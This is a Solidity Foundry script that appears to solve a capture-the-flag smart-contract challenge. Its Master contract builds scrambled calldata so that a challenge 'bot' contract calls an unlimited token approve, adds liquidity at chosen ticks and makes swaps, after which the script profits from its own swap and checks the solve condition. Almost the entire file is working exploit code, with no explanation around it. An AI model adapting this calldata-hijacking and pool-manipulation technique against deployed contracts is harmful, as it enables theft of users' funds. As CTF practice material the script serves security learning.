// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;
import {Script, console2} from "forge-std/Script.sol";
import {Setup} from "src/challenge/Setup.sol";
import {SafeToken} from "src/challenge/SafeToken.sol";
import {SafeExchanger} from "src/challenge/SafeExchanger.sol";


contract Master {
    receive() external payable {}
    function run(Setup setup) public payable returns(bool){
        SafeToken safe_token = setup.safe_token();
        SafeExchanger safe_exchanger = setup.safe_exchanger();
        address bot = setup.bot();

        bytes memory payload = abi.encodePacked(address(safe_token), uint96(0x0));
        payload = abi.encodePacked(payload,abi.encodeWithSelector(safe_token.approve.selector,uint256(uint160(address(safe_exchanger))),type(uint256).max));
        for(uint i=payload.length;i<0x84;i++){
            payload = abi.encodePacked(payload,bytes1(0));
        }
        bytes memory out = return_payload(payload);
        (bool success, bytes memory data) = bot.call{value: 2 wei}(out);

        // add liquidity
        payload = abi.encodePacked(address(safe_exchanger), uint96(100_000 ether));
        payload = abi.encodePacked(payload,abi.encodeWithSelector(safe_exchanger.addLiquidity.selector,uint256(93550), uint256(93560),uint256(999 ether)));
        
        
        for(uint i=payload.length;i<0x84;i++){
            payload = abi.encodePacked(payload,bytes1(0));
        }
        out = return_payload(payload);
        
        (success, data) = bot.call{value: 2 wei}(out);

        // check 93550 liquidity
        (uint256 tokenAmount, uint256 ethAmount) = safe_exchanger.liquidityByTick(93550);
        
        

        // target, value
        payload = abi.encodePacked(address(safe_exchanger), uint96(0));
        payload = abi.encodePacked(payload, abi.encodeWithSelector(safe_exchanger.swap.selector,false,uint256(12689 ether)));
        for(uint i=payload.length;i<0x84;i++){
            payload = abi.encodePacked(payload,bytes1(0));
        }
        out = return_payload(payload);
        (success, data) = bot.call{value: 2 wei}(out);
        

        setup.faucet{value: 8 ether}();
        safe_token.approve(address(safe_exchanger), 7 ether);
        uint256 beforeBalance = address(this).balance;
        safe_exchanger.swap(false, 7 ether);
        uint256 afterBalance = address(this).balance;
        
        setup.check();
        return setup.isSolved();
    }
    function return_payload(bytes memory payload) public pure returns(bytes memory){
        
        bytes memory out = abi.encodePacked(payload,"");
        uint c=0;

        for(uint i=0x40-6;i<0x44;i++){
            out[c] = payload[i];
            c+=1;
        }

        for(uint i=0x44;i<0x54;i++){
            out[c] = payload[i];
            c+=1;
        }

        for(uint i=0x00;i<0x06;i++){
            out[c] = payload[i];
            c+=1;
        }

        for(uint i=18;i<18+10;i++){
            out[c] = payload[i];
            c+=1;
        }

        for(uint i=0x40+20;i<0x40+36;i++){
            out[c] = payload[i];
            c+=1;
        }

        for(uint i=0xc;i<0xc+6;i++){
            out[c] = payload[i];
            c+=1;
        }
        
        for(uint i=0x26;i<0x26+10;i++){
            out[c] = payload[i];
            c+=1;
        }
        for(uint i=0x20-4;i<0x20-4+10;i++){
            out[c] = payload[i];
            c+=1;
        }
        for(uint i=0x20+16;i<0x20+16+10;i++){
            out[c] = payload[i];
            c+=1;
        }
        for(uint i=0x6;i<0xc;i++){
            out[c] = payload[i];
            c+=1;
        }
        for(uint i=0x64;i<0x64+0x10;i++){
            out[c] = payload[i];
            c+=1;
        }
        return out;
    }
}
